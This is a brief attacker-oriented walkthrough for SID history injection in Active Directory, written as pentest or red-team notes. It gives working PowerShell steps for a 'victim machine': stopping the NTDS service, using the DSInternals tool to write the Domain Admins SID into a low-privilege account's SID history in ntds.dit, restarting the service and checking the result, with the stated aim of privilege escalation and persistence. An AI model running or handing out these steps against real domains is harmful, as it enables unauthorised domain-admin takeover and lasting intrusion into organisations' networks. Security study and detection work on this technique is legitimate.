We can forge some history in order to leverage privileges and gain us
some persistence within the network.

First, launch powershell within the victim machine.
You want to get an SSH session with some local admin credentials for this one.

Once you've got all the req's, do the following:

Get-ADUser <youraduser> -properties sidhistory,memberof

Make sure that your low privilege user does not have any sort of information
inside of their SID history. (Command above)

Then, get the SID of the Domain Admins group since this is the group
we want to add to our SID history:

Get-ADGroup "Domain Admins"
We could use mimikatz for this, but there is a flaw in the system which 
doesn't patch LSASS to update our history, so we need another tool.

We will be using a tool named DS Internals for this. 
Firstly, stop the ntds service:
Stop-Service -Name ntds -force

Then, add the SID history:
Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 

Then, start it:
Start-Service -Name ntds 

Now, we should start a new powershell session and then verify that we have
admin credentials:
Get-ADUser aaron.jones -Properties sidhistory
